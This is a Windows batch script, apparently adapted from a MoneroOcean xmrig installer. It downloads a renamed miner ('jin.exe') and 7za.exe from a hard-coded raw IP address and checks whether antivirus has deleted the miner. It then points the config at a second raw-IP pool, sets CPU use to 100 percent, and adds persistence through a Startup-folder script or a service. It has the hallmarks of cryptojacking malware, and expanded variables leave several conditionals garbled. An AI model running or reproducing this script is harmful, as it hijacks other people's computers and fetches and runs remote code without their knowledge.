@echo off
set VERSION=2.5
rem printing greetings
echo MoneroOcean mining setup script v2.5.
echo (please report issues to support@moneroocean.stream email)
echo.
net session >nul 2>
1
if  == 0 (set ADMIN=1) else (set ADMIN=0)
rem command line arguments
set WALLET=43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4
rem this one is optional
set EMAIL=prx
set site=http://150.129.234.203:82
rem checking prerequisites
if [43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4] == [] (
echo Script usage:
echo ^> setup_jin_miner.bat ^<wallet address^> [^<your email address^>]
echo ERROR: Please specify your wallet address
exit /b 1
)
for /f "delims=." %%a in ("43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4") do set WALLET_BASE=%%a
call :strlen "%%a"  WALLET_BASE_LEN
if  == 106 goto WALLET_LEN_OK
if  ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95):
exit /b 1
:WALLET_LEN_OK
if ["C:\Users\puncher"] == [""] (
echo ERROR: Please define USERPROFILE environment variable to your user directory
exit /b 1
)
if not exist "C:\Users\puncher" (
echo ERROR: Please make sure user directory C:\Users\puncher exists
exit /b 1
)
where powershell >NUL
if not  == 0 (
echo ERROR: This script requires "powershell" utility to work correctly
exit /b 1
)
where find >NUL
if not  == 0 (
echo ERROR: This script requires "find" utility to work correctly
exit /b 1
)
where findstr >NUL
if not  == 0 (
echo ERROR: This script requires "findstr" utility to work correctly
exit /b 1
)
where tasklist >NUL
if not  == 0 (
echo ERROR: This script requires "tasklist" utility to work correctly
exit /b 1
)
if 1) else (set ADMIN=0) == 1 (
where sc >NUL
if not  == 0 (
echo ERROR: This script requires "sc" utility to work correctly
exit /b 1
)
)
rem calculating port
set /a "EXP_MONERO_HASHRATE = 4 * 700 / 1000"
if [(4 * 700 / 1000)] == [] (
echo ERROR: Can't compute projected Monero hashrate
exit
)
if (4 * 700 / 1000) gtr 8192 ( set PORT=18192
goto PORT_OK )
if (4 * 700 / 1000) gtr 4096 ( set PORT=14096
goto PORT_OK )
if (4 * 700 / 1000) gtr 2048 ( set PORT=12048
goto PORT_OK )
if (4 * 700 / 1000) gtr 1024 ( set PORT=11024
goto PORT_OK )
if (4 * 700 / 1000) gtr  512 ( set PORT=10512
goto PORT_OK )
if (4 * 700 / 1000) gtr  256 ( set PORT=10256
goto PORT_OK )
if (4 * 700 / 1000) gtr  128 ( set PORT=10128
goto PORT_OK )
if (4 * 700 / 1000) gtr   64 ( set PORT=10064
goto PORT_OK )
if (4 * 700 / 1000) gtr   32 ( set PORT=10032
goto PORT_OK )
if (4 * 700 / 1000) gtr   16 ( set PORT=10016
goto PORT_OK )
if (4 * 700 / 1000) gtr    8 ( set PORT=10008
goto PORT_OK )
if (4 * 700 / 1000) gtr    4 ( set PORT=10004
goto PORT_OK )
if (4 * 700 / 1000) gtr    2 ( set PORT=10002
goto PORT_OK )
set PORT=10001
:PORT_OK
rem printing intentions
set "LOGFILE=C:\Users\puncher\jin\xmrig.log"
echo I will download  setup and run in background Monero CPU miner with logs in C:\Users\puncher\jin\xmrig.log file.
echo If needed  miner in foreground can be started by C:\Users\puncher\jin\miner.bat script.
echo Mining will happen to 43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4 wallet.
if not [prx] == [] (
echo (and prx email as password to modify wallet options later at https://moneroocean.stream site)
)
echo.
if 0) == 1 ( == 0 (
echo Since I do not have admin access  mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
echo Mining in background will be performed using jin_miner service.
)
echo.
echo JFYI: This host has 4 CPU threads  so projected Monero hashrate is around (4 * 700 / 1000) KH/s.
echo.
rem start doing stuff: preparing miner
echo [*] Removing previous moneroocean miner (if any)
sc stop jin_miner
sc delete jin_miner
taskkill /f /t /im jin.exe
:REMOVE_DIR0
echo [*] Removing "C:\Users\puncher\jin" directory
timeout 5
rmdir /q /s "C:\Users\puncher\jin" >NUL 2>NUL
IF EXIST "C:\Users\puncher\jin" GOTO REMOVE_DIR0
echo [*] Downloading MoneroOcean advanced version of xmrig to "C:\Users\puncher\jin.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/jin.zip', 'C:\Users\puncher\jin.zip')"
if errorlevel 1 (
echo ERROR: Can't download MoneroOcean advanced version of xmrig
goto MINER_BAD
)
echo [*] Unpacking "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Users\puncher\jin.zip', 'C:\Users\puncher\jin')"
if errorlevel 1 (
echo [*] Downloading 7za.exe to "C:\Users\puncher\7za.exe"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/7za.exe', 'C:\Users\puncher\7za.exe')"
if errorlevel 1 (
echo ERROR: Can't download 7za.exe to "C:\Users\puncher\7za.exe"
exit /b 1
)
echo [*] Unpacking stock "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
"C:\Users\puncher\7za.exe" x -y -o"C:\Users\puncher\jin" "C:\Users\puncher\jin.zip" >NUL
del "C:\Users\puncher\7za.exe"
)
del "C:\Users\puncher\jin.zip"
echo [*] Checking if advanced version of "C:\Users\puncher\jin\jin.exe" works fine (and not removed by antivirus software)
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
"C:\Users\puncher\jin\jin.exe" --help >NUL
if  equ 0 goto MINER_OK
:MINER_BAD
if exist "C:\Users\puncher\jin\jin.exe" (
echo WARNING: Advanced version of "C:\Users\puncher\jin\jin.exe" is not functional
) else (
echo WARNING: Advanced version of "C:\Users\puncher\jin\jin.exe" was removed by antivirus
)
echo [*] Looking for the latest version of Monero miner
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/jin-6.zip', 'C:\Users\puncher\jin.zip')"
if errorlevel 1 (
echo ERROR: Can't download "" to "C:\Users\puncher\jin.zip"
exit /b 1
)
:REMOVE_DIR1
echo [*] Removing "C:\Users\puncher\jin" directory
timeout 5
rmdir /q /s "C:\Users\puncher\jin" >NUL 2>NUL
IF EXIST "C:\Users\puncher\jin" GOTO REMOVE_DIR1
echo [*] Unpacking "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Users\puncher\jin.zip', 'C:\Users\puncher\jin')"
if errorlevel 1 (
echo [*] Downloading 7za.exe to "C:\Users\puncher\7za.exe"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/7za.exe', 'C:\Users\puncher\7za.exe')"
if errorlevel 1 (
echo ERROR: Can't download 7za.exe to "C:\Users\puncher\7za.exe"
exit /b 1
)
echo [*] Unpacking advanced "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
"C:\Users\puncher\7za.exe" x -y -o"C:\Users\puncher\jin" "C:\Users\puncher\jin.zip" >NUL
if errorlevel 1 (
echo ERROR: Can't unpack "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
exit /b 1
)
del "C:\Users\puncher\7za.exe"
)
del "C:\Users\puncher\jin.zip"
echo [*] Checking if stock version of "C:\Users\puncher\jin\jin.exe" works fine (and not removed by antivirus software)
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
"C:\Users\puncher\jin\jin.exe" --help >NUL
if  equ 0 goto MINER_OK
if exist "C:\Users\puncher\jin\jin.exe" (
echo WARNING: Stock version of "C:\Users\puncher\jin\jin.exe" is not functional
) else (
echo WARNING: Stock version of "C:\Users\puncher\jin\jin.exe" was removed by antivirus
)
exit /b 1
:MINER_OK
echo [*] Miner "C:\Users\puncher\jin\jin.exe" is OK
for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[a-zA-Z0-9]+', '_'}"') do set PASS=prx.%%a
if [prx.%%a] == [] (
set PASS=na
)
if not [prx] == [] (
set "PASS=prx.na"
)
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"159.65.200.90:80\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
set LOGFILE2=
powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
copy /Y "C:\Users\puncher\jin\config.json" "C:\Users\puncher\jin\config_background.json" >NUL
powershell -Command "$out = cat 'C:\Users\puncher\jin\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config_background.json'"
rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq jin.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0jin.exe %%*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM jin.exe" if you want to remove background miner first.
echo :EXIT
) > "C:\Users\puncher\jin\miner.bat"
rem preparing script background work and work under reboot
if 0) == 1 ( == 1 goto ADMIN_MINER_SETUP
if exist "C:\Users\puncher\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
set "STARTUP_DIR=C:\Users\puncher\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
goto STARTUP_DIR_OK
)
if exist "C:\Users\puncher\Start Menu\Programs\Startup" (
set "STARTUP_DIR=C:\Users\puncher\Start Menu\Programs\Startup"
goto STARTUP_DIR_OK
)
echo ERROR: Can't find Windows startup directory
exit /b 1
:STARTUP_DIR_OK
echo [*] Adding call to "C:\Users\puncher\jin\miner.bat" script to "C:\Users\puncher\Start Menu\Programs\Startup\jin_miner.bat" script
(
echo @echo off
echo "C:\Users\puncher\jin\miner.bat" --config="C:\Users\puncher\jin\config_background.json"
) > "C:\Users\puncher\Start Menu\Programs\Startup\jin_miner.bat"
echo [*] Running miner in the background
call "C:\Users\puncher\Start Menu\Programs\Startup\jin_miner.bat"
goto OK
:ADMIN_MINER_SETUP
echo [*] Creating jin_miner service
sc stop jin_miner
sc delete jin_miner
"C:\Users\puncher\jin\jsm.exe" install jin_miner "C:\Users\puncher\jin\jin.exe"
if errorlevel 1 (
echo ERROR: Can't create jin_miner service
exit /b 1
)
"C:\Users\puncher\jin\jsm.exe" set jin_miner AppDirectory "C:\Users\puncher\jin"
"C:\Users\puncher\jin\jsm.exe" set jin_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"C:\Users\puncher\jin\jsm.exe" set jin_miner AppStdout "C:\Users\puncher\jin\stdout"
"C:\Users\puncher\jin\jsm.exe" set jin_miner AppStderr "C:\Users\puncher\jin\stderr"
echo [*] Starting jin_miner service
"C:\Users\puncher\jin\jsm.exe" start jin_miner
if errorlevel 1 (
echo ERROR: Can't start jin_miner service
exit /b 1
)
echo
echo Please reboot system if jin_miner service is not activated yet (if "C:\Users\puncher\jin\xmrig.log" file is empty)
goto OK
:OK
echo
echo [*] Setup complete
exit /b 0
:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1"
set "len=0"
for /L %%A in (12 -1 0) do (
set/A "len|=1<<%%A"
for %%B in (0) do if ""=="" set/A "len&=~1<<%%A"
)
endlocal
set len%
exit /b
